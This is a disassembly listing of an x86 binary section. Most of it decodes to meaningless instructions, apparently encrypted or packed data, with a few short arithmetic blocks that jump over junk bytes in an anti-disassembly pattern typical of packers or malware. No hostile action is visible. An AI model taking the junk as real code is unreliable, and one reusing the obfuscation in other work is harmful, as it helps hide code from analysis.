  404a5f:	es jbe 0x404ab8
  404a62:	pusha  
  404a63:	dec    eax
  404a64:	out    dx,eax
  404a65:	jbe    0x404aae
  404a67:	aam    0xc0
  404a69:	sub    BYTE PTR [eax],ah
  404a6b:	das    
  404a6c:	add    ah,bh
  404a6e:	xchg   esp,eax
  404a6f:	push   ebx
  404a70:	fisub  DWORD PTR [edi-0x3d]
  404a73:	imul   DWORD PTR [eax-0x6a684172]
  404a79:	clc    
  404a7a:	and    ebp,edi
  404a7c:	and    edx,edi
  404a7e:	cmp    al,ch
  404a80:	adc    ecx,ecx
  404a82:	xor    edi,DWORD PTR [edi]
  404a84:	add    al,0x48
  404a86:	inc    edi
  404a87:	xor    DWORD PTR [ebx+0x720c8052],ecx
  404a8d:	push   ebx
  404a8e:	pusha  
  404a8f:	stc    
  404a90:	inc    eax
  404a91:	mov    eax,ds:0x954a6a4a
  404a96:	and    ch,BYTE PTR [eax+esi*2]
  404a99:	sahf   
  404a9a:	stc    
  404a9b:	or     BYTE PTR [edx],dh
  404a9d:	inc    ebx
  404a9e:	call   DWORD PTR [edi-0x3a]
  404aa1:	aas    
  404aa2:	add    ebx,DWORD PTR [eax+0x12aadc24]
  404aa8:	or     DWORD PTR [ecx+0x40a4eb7c],ebx
  404aae:	xor    eax,DWORD PTR [ebp+0x3e394a69]
  404ab4:	inc    ebp
  404ab5:	out    dx,al
  404ab6:	sar    BYTE PTR ds:0xa9119bad,0xf9
  404abd:	xchg   esi,eax
  404abe:	(bad)  
  404abf:	out    0xcc,eax
  404ac1:	loope  0x404a61
  404ac3:	add    DWORD PTR [edi-0x97d4a1f],ebp
  404ac9:	les    esi,FWORD PTR [eax+esi*2+0x18f9d6cb]
  404ad0:	pushf  
  404ad1:	mov    ecx,0x1a4361bb
  404ad6:	scas   al,BYTE PTR es:[edi]
  404ad7:	mov    ecx,DWORD PTR [eax+0x65]
  404ada:	fs mov ch,0x3a
  404add:	dec    ebp
  404ade:	jmp    0x404a84
  404ae0:	daa    
  404ae1:	fld    QWORD PTR [eax-0x43]
  404ae4:	mov    edi,0x64eea866
  404ae9:	dec    esi
  404aea:	mov    ebx,0xb53d4fef
  404aef:	push   edi
  404af0:	mov    al,bh
  404af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404af3:	fwait
  404af4:	sar    BYTE PTR [edi+0x133e85dc],0x46
  404afb:	mov    dh,0x69
  404afd:	addr16 push ebp
  404aff:	shl    BYTE PTR [edx+0x6cdd616d],1
  404b05:	xchg   esi,eax
  404b06:	aaa    
  404b07:	mov    dl,0xf3
  404b09:	and    al,0x77
  404b0b:	and    esp,eax
  404b0d:	or     eax,0x264eb093
  404b12:	or     edx,ebx
  404b14:	xchg   BYTE PTR [ebp+0x76],bl
  404b17:	stos   BYTE PTR es:[edi],al
  404b18:	jl     0x404af9
  404b1a:	xchg   ebx,eax
  404b1b:	stos   DWORD PTR es:[edi],eax
  404b1c:	(bad)  
  404b1d:	js     0x404b23
  404b1f:	inc    esp
  404b20:	pop    ss
  404b21:	mov    edi,0x833ee766
  404b26:	xchg   ebp,eax
  404b27:	adc    eax,0x3d652f5a
  404b2c:	adc    ch,BYTE PTR [edx]
  404b2e:	push   cs
  404b2f:	je     0x404b13
  404b31:	cmc    
  404b32:	mov    cl,0x1
  404b34:	sbb    al,0xdc
  404b36:	scas   al,BYTE PTR es:[edi]
  404b37:	mov    al,BYTE PTR [edi+0x7431945e]
  404b3d:	fst    QWORD PTR [eax+esi*1-0x5f]
  404b41:	inc    ecx
  404b42:	dec    ebp
  404b43:	ins    BYTE PTR es:[edi],dx
  404b44:	cmp    ebp,DWORD PTR [edx+0x269dcbca]
  404b4a:	retf   
  404b4b:	bound  ecx,QWORD PTR [ebp-0x3e]
  404b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b4f:	mov    cl,0x77
  404b51:	xchg   BYTE PTR [edx-0x73],bl
  404b54:	(bad)  
  404b55:	loopne 0x404b7a
  404b57:	out    dx,al
  404b58:	push   eax
  404b59:	lds    ebp,FWORD PTR [ecx-0x1cc9f6c0]
  404b5f:	fild   WORD PTR [edx-0x4d]
  404b62:	jb     0x404bc6
  404b64:	push   ebx
  404b65:	dec    edx
  404b66:	call   0xe5b6:0xa827e082
  404b6d:	in     eax,0x5f
  404b6f:	mov    edi,DWORD PTR [ebp-0x1c]
  404b72:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404b79:	mov    BYTE PTR [ebp+0xb],dl
  404b7c:	mov    dl,BYTE PTR [ebp+0xf]
  404b7f:	mov    edi,DWORD PTR [ebp-0xc]
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	jbe    0x404bea
  404b9a:	scas   eax,DWORD PTR es:[edi]
  404b9b:	xchg   ebx,eax
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b87
  404ba5:	sub    BYTE PTR [esi],dl
  404ba7:	xor    DWORD PTR [esi],ebx
  404ba9:	sub    DWORD PTR [edx+0x6fac406e],0xffffffbc
  404bb0:	cwde   
  404bb1:	mov    ds:0xcda97cd2,eax
  404bb6:	aad    0x92
  404bb8:	gs xor dh,ch
  404bbb:	pop    eax
  404bbc:	pop    ebp
  404bbd:	push   0xdd1d1c93
  404bc2:	push   eax
  404bc3:	add    al,0x44
  404bc5:	(bad)  
  404bc6:	add    DWORD PTR [ecx-0x5768237c],ebp
  404bcc:	pop    esi
  404bcd:	ret    0x7c3a
  404bd0:	cmp    al,0x4a
  404bd2:	pop    edx
  404bd3:	test   BYTE PTR [esi-0x7df47c5e],0x8d
  404bda:	rcr    DWORD PTR [eax+0x66a18a23],0xdd
  404be1:	sbb    edi,edx
  404be3:	mov    ebp,0x6e105c34
  404be8:	es push ds
  404bea:	mov    ecx,0xe69f70f7
  404bef:	sub    eax,esp
  404bf1:	mov    ds:0x2d1ff3f0,eax
  404bf6:	push   ebx
  404bf7:	(bad)  
  404bf9:	js     0x404bea
  404bfb:	and    ch,bh
  404bfd:	adc    esi,DWORD PTR [ebp-0x5541b994]
  404c03:	cmp    esp,eax
  404c05:	or     esp,esi
  404c07:	xor    DWORD PTR [eax-0x67],esi
  404c0a:	stc    
  404c0b:	add    al,0xbd
  404c0d:	ret    0xe9b9
  404c10:	push   0x6d
  404c12:	inc    ebx
  404c13:	ror    DWORD PTR [esi+edi*8],1
  404c16:	push   esp
  404c17:	or     eax,0x7ea2abd1
  404c1c:	jmp    0x404be2
  404c1e:	mov    bh,ah
  404c20:	xchg   edi,eax
  404c21:	imul   edi,DWORD PTR [ecx],0x94173ac9
  404c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c28:	fisub  WORD PTR [esi-0x17678bfa]
  404c2e:	fs pop esi
  404c30:	mov    ebp,0x17a731e3
  404c35:	iret   
  404c36:	stos   BYTE PTR es:[edi],al
  404c37:	mov    edi,0x62a2ccf9
  404c3c:	xchg   edx,eax
  404c3d:	mov    dh,0xbb
  404c3f:	xor    al,0x18
  404c41:	xchg   esp,edi
  404c43:	call   0xe08b:0xe3b1bdd2
  404c4a:	cmp    esi,ebx
  404c4c:	pop    ds
  404c4d:	or     dl,BYTE PTR [edi-0x13fdd39b]
  404c53:	leave  
  404c54:	pushf  
  404c55:	mov    ebx,0xe98fe909
  404c5a:	repnz cmp al,0xff
  404c5d:	leave  
  404c5e:	jae    0x404bfd
  404c60:	(bad)  [ecx-0x42f44377]
  404c66:	sub    DWORD PTR [edx],esp
  404c68:	push   ebx
  404c69:	sbb    BYTE PTR [ecx-0x1014b34c],bh
  404c6f:	mov    esi,0xe8dc864d
  404c74:	js     0x404c4f
  404c76:	sub    al,0xb7
  404c78:	out    0x9c,al
  404c7a:	xor    bh,BYTE PTR [eax+edi*1]
  404c7d:	xchg   dx,ax
  404c7f:	add    eax,0x689a5fff
  404c84:	mov    al,cs:0x16327dc7
  404c8a:	inc    eax
  404c8b:	cmp    eax,0x2434925e
  404c90:	test   dh,ch
  404c92:	jge    0x404d05
  404c94:	bound  edx,QWORD PTR [edx+0x578f81b8]
  404c9a:	and    BYTE PTR [esi],dh
  404c9c:	sub    bh,BYTE PTR [ebx-0x1047d22c]
  404ca2:	xchg   DWORD PTR ss:[eax-0x14f8734c],ecx
  404ca9:	stos   BYTE PTR es:[edi],al
  404caa:	lea    edi,[ebx+0x724c7a35]
  404cb0:	lahf   
  404cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cb2:	dec    eax
  404cb3:	(bad)  
  404cb4:	push   dx
  404cb6:	mov    dh,0x8d
  404cb8:	inc    esi
  404cb9:	push   cs
  404cba:	dec    ebp
  404cbb:	stos   DWORD PTR es:[edi],eax
  404cbc:	fadd   DWORD PTR [edx-0x76]
  404cbf:	sahf   
  404cc0:	add    al,0x8e
  404cc2:	int    0x6e
  404cc4:	dec    esi
  404cc5:	fidivr WORD PTR [eax]
  404cc7:	stos   BYTE PTR es:[edi],al
  404cc8:	mov    dh,0xc8
  404cca:	cdq    
  404ccb:	push   0xffffff93
  404ccd:	lahf   
  404cce:	or     DWORD PTR [edi],ecx
  404cd0:	aad    0x94
  404cd2:	ins    DWORD PTR es:[edi],dx
  404cd3:	or     ebp,edx
  404cd5:	pop    edx
  404cd6:	push   ss
  404cd7:	and    dx,bp
  404cda:	dec    edi
  404cdb:	popa   
  404cdc:	jo     0x404c79
  404cde:	repnz xor esi,0x5e
  404ce2:	jae    0x404d43
  404ce4:	inc    eax
  404ce5:	in     al,dx
  404ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce7:	cli    
  404ce8:	pop    edx
  404ce9:	inc    eax
  404cea:	jns    0xc38ea4cb
  404cf0:	ror    DWORD PTR [eax+0x3a],cl
  404cf3:	std    
  404cf4:	retf   
  404cf5:	aaa    
  404cf6:	or     BYTE PTR [ebp+edx*2+0x71c8dab4],al
  404cfd:	call   0xe45da956
  404d02:	stos   BYTE PTR es:[edi],al
  404d03:	lds    edi,FWORD PTR [esi]
  404d05:	mov    DWORD PTR [ecx+ecx*1-0x4c74a759],esi
  404d0c:	push   es
  404d0d:	outs   dx,BYTE PTR ds:[esi]
  404d0e:	lock mov esi,DWORD PTR [eax+ecx*1+0x17f39169]
  404d16:	imul   edi,ebp,0xc879d8ec
  404d1c:	push   edi
  404d1d:	mov    edi,0xdc6fdae1
  404d22:	cmp    al,0x16
  404d24:	cdq    
  404d25:	int3   
  404d26:	in     eax,0x68
  404d28:	mov    WORD PTR [ebp+0x78],fs
  404d2b:	inc    ebx
  404d2c:	pop    ds
  404d2d:	sar    BYTE PTR ds:0x5d8b66aa,cl
  404d33:	in     al,0x88
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    ah,ch
  404d93:	test   DWORD PTR ds:0x7e2fbb19,esp
  404d99:	jle    0x404d26
  404d9b:	jg     0x404e1b
  404d9d:	jle    0x404da2
  404d9f:	xor    bh,BYTE PTR [eax+0x76]
  404da2:	cmp    DWORD PTR [esi+0x3],edx
  404da5:	out    dx,al
  404da6:	push   ds
  404da7:	arpl   ax,ax
  404da9:	scas   eax,DWORD PTR es:[edi]
  404daa:	push   ebp
  404dab:	or     eax,0x4071cd35
  404db0:	ror    DWORD PTR [ecx],1
  404db2:	std    
  404db3:	add    DWORD PTR [eax],ebp
  404db5:	or     cl,BYTE PTR ds:0xd0497432
  404dbb:	ret    
  404dbc:	pop    esi
  404dbd:	or     cl,BYTE PTR [edi+0x1b1545d2]
  404dc3:	out    dx,eax
  404dc4:	out    dx,eax
  404dc5:	xchg   ecx,eax
  404dc6:	jmp    0x529d:0xc58adb5a
  404dcd:	mov    WORD PTR [edx+0x5b8da546],ds
  404dd3:	rcr    BYTE PTR gs:[ebx],1
  404dd6:	outs   dx,DWORD PTR ds:[esi]
  404dd7:	push   edi
  404dd8:	dec    esi
  404dd9:	cmp    dh,bl
  404ddb:	(bad)  
  404ddc:	sbb    eax,0x575e6711
  404de1:	add    edx,esi
  404de3:	lock cld 
  404de5:	add    BYTE PTR [edi-0x372fd7e7],bl
  404deb:	dec    edi
  404dec:	shr    DWORD PTR [eax],0x3b
  404def:	add    esp,DWORD PTR [ebp-0x52]
  404df2:	ds into 
  404df4:	iret   
  404df5:	xchg   edi,eax
  404df6:	rcl    BYTE PTR [eax-0x7e3f2b26],0x28
  404dfd:	ins    BYTE PTR es:[edi],dx
  404dfe:	test   al,0x2c
  404e00:	shl    DWORD PTR [eax+0x0],1
  404e03:	jmp    0x909cd402
  404e08:	jg     0x404d99
  404e0a:	inc    ebx
  404e0b:	pop    edi
  404e0c:	sbb    BYTE PTR [ebx-0x4a],bl
  404e0f:	and    eax,0x958b5a13
  404e14:	dec    ebx
  404e15:	push   edx
  404e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e17:	inc    esi
  404e18:	leave  
  404e19:	xor    BYTE PTR [edi-0xa14c730],dh
  404e1f:	mov    ecx,0xf7f58ea
  404e24:	cmc    
  404e25:	adc    BYTE PTR [ebx+ecx*2+0x720da999],al
  404e2c:	(bad)  
  404e2d:	in     al,0x64
  404e2f:	and    ebx,edi
  404e31:	sbb    al,ah
  404e33:	arpl   WORD PTR [edi],cx
  404e35:	enter  0x8f96,0x95
  404e39:	pop    ss
  404e3a:	jo     0x404df1
  404e3c:	ja     0x404e6e
  404e3e:	ret    
  404e3f:	(bad)  
  404e40:	stc    
  404e41:	call   0x17d8027e
  404e46:	pop    ds
  404e47:	and    bh,BYTE PTR [edx-0xc]
  404e4a:	push   ecx
  404e4b:	daa    
  404e4c:	push   cs
  404e4d:	jecxz  0x404e10
  404e4f:	(bad)  
  404e50:	stos   DWORD PTR es:[edi],eax
  404e51:	pop    esp
  404e52:	sub    esp,edx
  404e54:	sar    DWORD PTR [edx+ebp*2],0x22
  404e58:	mov    edi,fs
  404e5a:	xor    BYTE PTR [edi-0x4b],0x5b
  404e5e:	(bad)  
  404e5f:	(bad)  [edi-0x6d98a511]
  404e65:	lds    esi,FWORD PTR [esi-0x7]
  404e68:	mov    esi,0x2d20282
  404e6d:	inc    eax
  404e6e:	lea    ebx,[ecx]
  404e70:	stos   DWORD PTR es:[edi],eax
  404e71:	and    BYTE PTR [edi+0xe3e18eb],dl
  404e77:	into   
  404e78:	jge    0x404e0a
  404e7a:	out    dx,al
  404e7b:	jle    0x404e17
  404e7d:	test   BYTE PTR [edi],0x89
  404e80:	daa    
  404e81:	mov    ds:0x563c7200,al
  404e86:	retf   0x70a2
  404e89:	sar    DWORD PTR [ecx],0x2c
  404e8c:	cli    
  404e8d:	add    eax,ebx
  404e8f:	ins    DWORD PTR es:[edi],dx
  404e90:	push   esi
  404e91:	std    
  404e92:	mov    ebp,0x5cac27e
  404e97:	mov    bl,0x5d
  404e99:	pop    edx
  404e9a:	xchg   DWORD PTR [edi-0x59d15b7e],edx
  404ea0:	push   ebx
  404ea1:	mov    bl,BYTE PTR [ebx-0x43ef7818]
  404ea7:	popa   
  404ea8:	leave  
  404ea9:	xchg   esi,eax
  404eaa:	fdivp  st(4),st
  404eac:	loope  0x404e3c
  404eae:	xchg   esp,eax
  404eaf:	xor    eax,0x726dfd30
  404eb4:	enter  0x9498,0xe2
  404eb8:	sbb    al,0x93
  404eba:	xchg   esp,eax
  404ebb:	cmp    al,BYTE PTR [eax+0x3]
  404ebe:	xchg   BYTE PTR [esi+0x12],ah
  404ec1:	test   eax,0x95e2ec32
  404ec6:	in     eax,dx
  404ec7:	jno    0x404e5c
  404ec9:	xchg   edx,eax
  404eca:	cdq    
  404ecb:	ins    DWORD PTR es:[edi],dx
  404ecc:	mov    ebp,0x7a4e383e
  404ed1:	cwde   
  404ed2:	arpl   WORD PTR [esi+0x2f36ec84],cx
  404ed8:	(bad)  
  404ed9:	into   
  404eda:	fsubr  QWORD PTR [edi-0x6]
  404ede:	adc    cl,BYTE PTR [ecx-0x2]
  404ee1:	and    edi,DWORD PTR [ebx+0x3954f7c]
  404ee7:	ins    BYTE PTR es:[edi],dx
  404ee8:	pinsrw mm5,WORD PTR [eax+0x35],0xf0
  404eed:	cs pop ebp
  404eef:	stc    
  404ef0:	outs   dx,BYTE PTR ds:[esi]
  404ef1:	test   al,0xe1
  404ef3:	add    ebx,0x55
  404ef6:	sbb    cl,BYTE PTR [edi+0x56]
  404ef9:	sub    al,BYTE PTR ds:0x72c8e415
  404eff:	je     0x404f13
  404f01:	jmp    0x88e3f4a4
  404f06:	xor    dh,bl
  404f08:	lods   al,BYTE PTR ds:[esi]
  404f09:	add    al,0xdb
  404f0b:	or     dh,bl
  404f0d:	retf   
  404f0e:	xor    ecx,ebp
  404f10:	mov    al,0x4e
  404f12:	push   ds
  404f13:	mov    ah,0x20
  404f15:	aad    0xdc
  404f17:	inc    edx
  404f18:	xor    BYTE PTR [ebp+0x7],al
  404f1b:	in     eax,dx
  404f1c:	gs aaa 
  404f1e:	ins    DWORD PTR es:[edi],dx
  404f1f:	jb     0x404ee4
  404f21:	add    eax,0xfed17929
  404f26:	lods   eax,DWORD PTR ds:[esi]
  404f27:	mov    ds:0x330b29cc,eax
  404f2c:	clc    
  404f2d:	add    edi,ecx
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x56d15a29
  404f44:	retf   
  404f45:	repz cwde 
  404f47:	enter  0x7e21,0x7e
  404f4b:	mov    edi,DWORD PTR [edi+0x7e]
  404f4e:	jle    0x404f7f
  404f50:	ja     0x404edd
  404f52:	outs   dx,BYTE PTR cs:[esi]
  404f54:	jns    0x404f44
  404f56:	jnp    0x404ee4
  404f58:	stos   BYTE PTR es:[edi],al
  404f59:	rcl    BYTE PTR [ecx+0x79],0x4c
  404f5d:	test   al,0xd7
  404f5f:	add    esp,esp
  404f61:	inc    edi
  404f62:	je     0x404f2d
  404f64:	xchg   ecx,eax
  404f65:	rol    BYTE PTR [edx],cl
  404f67:	jge    0x404f98
  404f69:	imul   ecx,esi,0xb343dfa0
  404f6f:	ins    DWORD PTR es:[edi],dx
  404f70:	mov    ah,0x7f
  404f72:	(bad)  
  404f74:	jg     0x404f5c
  404f76:	add    DWORD PTR [ebx-0x4f],ebx
  404f79:	aaa    
  404f7a:	dec    ecx
  404f7b:	out    dx,eax
  404f7c:	lods   eax,DWORD PTR ds:[esi]
  404f7d:	cmp    eax,0xdc011c9f
  404f82:	bts    DWORD PTR [edi],esi
  404f85:	sub    al,0xa5
  404f87:	xchg   DWORD PTR ds:0xb12114f,ecx
  404f8d:	sbb    eax,0xfb8a1bf1
  404f92:	push   ecx
  404f93:	or     eax,DWORD PTR [edi-0x49]
  404f96:	and    BYTE PTR [eax-0x2f956e16],ah
  404f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f9d:	xor    DWORD PTR [esi-0x54],ebp
  404fa0:	xlat   BYTE PTR ds:[ebx]
  404fa1:	test   eax,0xb04f2397
  404fa6:	adc    DWORD PTR [esi-0x51eaba77],esp
  404fac:	pop    ecx
  404fad:	add    eax,0x97aa98c0
  404fb2:	fidivr DWORD PTR [ebp+0x20]
  404fb5:	pop    es
  404fb6:	sub    eax,DWORD PTR [ebx]
  404fb8:	jmp    0xdfaed4ec
  404fbd:	fiadd  DWORD PTR [esi+0x63]
  404fc0:	xchg   ebp,eax
  404fc1:	mov    BYTE PTR [esi+eiz*4],dl
  404fc4:	pop    esp
  404fc5:	jns    0x404fd3
  404fc7:	xor    esi,DWORD PTR [ebx+0x2476fd9e]
  404fcd:	sub    DWORD PTR [eax+0xedc71d0],esi
  404fd3:	adc    al,0x82
  404fd5:	call   0x72d77fa3
  404fda:	dec    esi
  404fdb:	xor    eax,0xd864424b
  404fe0:	pusha  
  404fe1:	in     eax,0x45
  404fe3:	dec    ebx
  404fe4:	ret    
  404fe5:	xchg   ecx,eax
  404fe6:	xlat   BYTE PTR ds:[ebx]
  404fe7:	jecxz  0x404fcd
  404fe9:	xor    bl,BYTE PTR [edi-0x43aa250f]
  404fef:	push   0xffffffa2
  404ff1:	aad    0x2e
  404ff3:	mov    esp,0x16807197
  404ff8:	aas    
  404ff9:	mov    esi,0x228b4fe3
  404ffe:	or     eax,0x52986a6c
  405003:	push   cs
  405004:	pop    edx
  405005:	jnp    0x404fb9
  405007:	repz imul ebp,esp,0x5b
  40500b:	mov    ebp,0x67b7c3d4
  405010:	sub    ch,bl
  405012:	xor    DWORD PTR [edi-0x55],edi
  405015:	push   edi
  405016:	pop    ebx
  405017:	daa    
  405018:	inc    ecx
  405019:	mov    WORD PTR [esp+edx*8-0x4c4096b4],ss
  405020:	lahf   
  405021:	shl    BYTE PTR [esi],0xd
  405024:	lds    eax,FWORD PTR [eax]
  405026:	or     eax,0xeb4cd8b5
  40502b:	je     0x405049
  40502d:	xor    al,0x95
  40502f:	pop    ebx
  405030:	iret   
  405031:	lahf   
  405032:	add    ecx,DWORD PTR [ebx-0x1]
  405035:	ds push eax
  405037:	repz and cl,BYTE PTR [ebp-0x61ab6cf0]
  40503e:	push   edi
  40503f:	(bad)  
  405040:	arpl   WORD PTR [esi+0x4003245d],bx
  405046:	or     DWORD PTR [eax+0x596485f7],0xffffffd4
  40504d:	fwait
  40504e:	rcl    BYTE PTR [ecx],1
  405050:	sbb    eax,0x1868bebf
  405055:	nop    DWORD PTR [edi]
  405058:	jge    0x404ff0
  40505a:	sub    ecx,DWORD PTR [esi-0x6b4eadb6]
  405060:	fist   DWORD PTR [edx-0x31]
  405063:	jmp    0xce02:0xaa47fc36
  40506a:	daa    
  40506b:	mov    cl,0xf0
  40506d:	xchg   ebx,eax
  40506e:	xor    ebp,DWORD PTR [esi+0x7e]
  405071:	sub    BYTE PTR [ebp+0x218e2335],ch
  405077:	and    DWORD PTR [eax],ecx
  405079:	popf   
  40507a:	data16 and bh,cl
  40507d:	nop
  40507e:	aad    0x91
  405080:	fnstcw WORD PTR [eax-0x33ff489a]
  405086:	mov    ds:0x27b3b576,al
  40508b:	pusha  
  40508c:	dec    esi
  40508d:	icebp  
  40508e:	or     al,0xe3
  405090:	mov    cl,0xbb
  405092:	dec    esp
  405093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405094:	cmp    eax,0xfa615162
  405099:	push   es
  40509a:	mov    bl,0x41
  40509c:	sbb    bh,BYTE PTR [edi]
  40509e:	cmc    
  40509f:	pop    es
  4050a0:	call   edi
  4050a2:	inc    esi
  4050a3:	in     al,dx
  4050a4:	and    DWORD PTR [ebx+0x7e86ef0c],0x3e
  4050ab:	add    BYTE PTR [edx+0x6f90b134],al
  4050b1:	adc    al,0xb5
  4050b3:	push   ebp
  4050b4:	xchg   dx,ax
  4050b6:	xchg   ebp,eax
  4050b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050b8:	or     eax,0x273ec101
  4050bd:	ret    0xc27a
  4050c0:	push   ebx
  4050c1:	xchg   cx,ax
  4050c3:	sahf   
  4050c4:	stc    
  4050c5:	popa   
  4050c6:	nop
  4050c7:	aad    0xd
  4050c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050ca:	mov    eax,ds:0xdba2c685
  4050cf:	nop
  4050d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d1:	and    bl,BYTE PTR [edx+0x6]
  4050d4:	adc    cl,0x39
  4050d7:	jle    0x40509d
  4050d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050da:	scas   al,BYTE PTR es:[edi]
  4050db:	pop    esi
  4050dc:	mov    ebx,DWORD PTR [ebp-0x18]
  4050df:	xor    ebx,eax
  4050e1:	sub    edx,ecx
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	jb     0x4050b1
  40510f:	loope  0x405149
  405111:	inc    ebp
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405172
  40511a:	dec    edi
  40511b:	sub    BYTE PTR [ebp+0x57],bh
  40511e:	hlt    
  40511f:	and    dl,dh
  405121:	loop   0x405111
  405123:	call   0xcc3f0f7b
  405128:	out    dx,eax
  405129:	xchg   ecx,eax
  40512a:	in     al,0xa8
  40512c:	fisttp DWORD PTR [edi-0x12c160ba]
  405132:	or     dl,BYTE PTR [ebx+0x26ef5ccc]
  405138:	aas    
  405139:	fimul  WORD PTR [ecx+0xd]
  40513c:	das    
  40513d:	out    0x7d,al
  40513f:	nop
  405140:	sbb    ebp,DWORD PTR [edi]
  405142:	fs push edx
  405144:	mov    ch,0x11
  405146:	scas   eax,DWORD PTR es:[edi]
  405147:	je     0x405104
  405149:	sub    DWORD PTR [eiz*8-0x1a659269],esi
  405150:	dec    esp
  405151:	sbb    esp,DWORD PTR [edx-0x5c27f802]
  405157:	sub    cl,BYTE PTR [edi+eax*2]
  40515a:	xchg   esi,eax
  40515b:	aam    0x53
  40515d:	dec    esi
  40515e:	aaa    
  40515f:	aas    
  405160:	js     0x405101
  405162:	imul   esp,DWORD PTR [ecx+0x28],0x528d30c0
  405169:	push   eax
  40516a:	sahf   
  40516b:	cmp    dh,BYTE PTR [esi-0x3a]
  40516e:	pop    edi
  40516f:	ret    
  405170:	js     0x405190
  405172:	mov    dl,0x40
  405174:	sub    ax,0x306f
  405178:	sbb    eax,0xa6f5750d
  40517d:	or     eax,0x2314e1d7
  405182:	sub    eax,0x95af8c17
  405187:	add    DWORD PTR [esi-0x68f4364],0xd369768d
  405191:	sub    dh,dl
  405193:	in     al,0x55
  405195:	push   es
  405196:	and    al,0x65
  405198:	hlt    
  405199:	stos   DWORD PTR es:[edi],eax
  40519a:	rcr    DWORD PTR [edx],0x13
  40519d:	std    
  40519e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40519f:	xor    esi,DWORD PTR [ecx-0x32]
  4051a2:	enter  0xf9bd,0xce
  4051a6:	adc    dl,bl
  4051a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a9:	pop    edx
  4051aa:	ins    DWORD PTR es:[edi],dx
  4051ab:	pop    ebp
  4051ac:	add    ebp,DWORD PTR [esi+0x3b]
  4051af:	cld    
  4051b0:	mov    WORD PTR [ecx],fs
  4051b2:	(bad)  
  4051b3:	div    DWORD PTR [ebx-0x3969a548]
  4051b9:	mov    eax,DWORD PTR [edi]
  4051bb:	dec    esp
  4051bc:	test   BYTE PTR [ecx],cl
  4051be:	sub    eax,0x6855e09e
  4051c3:	push   es
  4051c4:	scas   al,BYTE PTR es:[edi]
  4051c5:	(bad)  
  4051c6:	mov    esp,0x23ecd9c5
  4051cb:	pop    ebx
  4051cc:	sub    al,0x86
  4051ce:	mov    eax,0x9d1ac453
  4051d3:	pop    esi
  4051d4:	pop    edi
  4051d5:	fisubr WORD PTR [edi-0x59e68697]
  4051db:	sub    DWORD PTR [eax+edi*8-0x34847959],0x34
  4051e3:	xchg   edx,eax
  4051e4:	or     eax,0x942bb126
  4051e9:	push   esp
  4051ea:	inc    BYTE PTR [ebp+0x65]
  4051ed:	icebp  
  4051ee:	(bad)
  4051f2:	test   BYTE PTR [edx],al
  4051f4:	push   eax
  4051f5:	and    ah,BYTE PTR [esi]
  4051f7:	cdq    
  4051f8:	(bad)  
  4051f9:	xor    DWORD PTR [edi-0x46],esp
  4051fc:	adc    al,0x62
  4051fe:	adc    DWORD PTR [ecx],esi
  405200:	jmp    0x405187
  405202:	xchg   edi,eax
  405203:	sar    DWORD PTR [ebx],0xc4
  405206:	mov    dl,0x35
  405208:	out    0xb1,al
